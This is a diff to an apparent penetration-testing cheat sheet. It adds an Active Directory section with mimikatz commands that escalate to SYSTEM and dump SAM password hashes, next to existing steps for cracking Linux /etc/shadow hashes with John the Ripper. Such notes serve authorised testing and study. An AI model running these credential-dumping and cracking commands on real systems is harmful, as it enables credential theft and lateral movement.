@@ -643,3 +643,24 @@ Cracking linux hashes - requires `/etc/passwd` and `/etc/shadow`
 $ unshadow passwd.txt shadow.txt > passwords.txt
 $ john --wordlist=rockyou.txt passwords.txt
 ```
+
+## Active Directory / Lateral Movement
+
+### Dumping Hashes
+
+```
+# Open mimikatz and escalate security token to SYSTEM integrity
+cmd> mimikatz.exe
+mimikatz > privilege::debug
+mimikatz > token::elevate
+
+# Dump contents of SAM database
+mimikatz > lsadump::sam
+```
+
+### Pass The Hash
+
+```
+TODO
+```
+
